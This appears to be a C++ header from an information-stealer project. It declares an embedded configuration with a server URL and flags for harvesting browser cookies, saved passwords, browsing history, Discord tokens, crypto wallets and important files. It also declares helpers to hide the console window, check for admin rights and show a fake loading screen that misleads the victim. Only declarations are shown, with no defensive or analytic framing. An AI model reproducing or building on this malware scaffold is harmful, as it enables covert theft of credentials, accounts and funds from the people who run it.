#pragma once
#include <string>
#include <chrono>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <optional>

// Embedded configuration structure
struct EmbeddedConfig {
    std::string user;
    std::string serverUrl;
    bool collectLocation;
    bool collectSystemInfo;
    bool collectRunningProcesses;
    bool collectInstalledApps;
    bool collectBrowserCookies;
    bool collectSavedPasswords;
    bool collectBrowserHistory;
    bool collectDiscordTokens;
    bool collectCryptoWallets;
    bool collectImportantFiles;
};

std::string get_current_date_time();
std::string format_bytes(long long bytes);
bool is_running_as_admin();
void hide_console_window();
std::string get_screen_size();
std::string get_local_ip_address();
void show_fake_loading_screen(const std::string& user);
bool get_feature_flag(const char* envVar, bool defaultValue);
std::optional<EmbeddedConfig> read_embedded_config();
std::string get_exe_path();
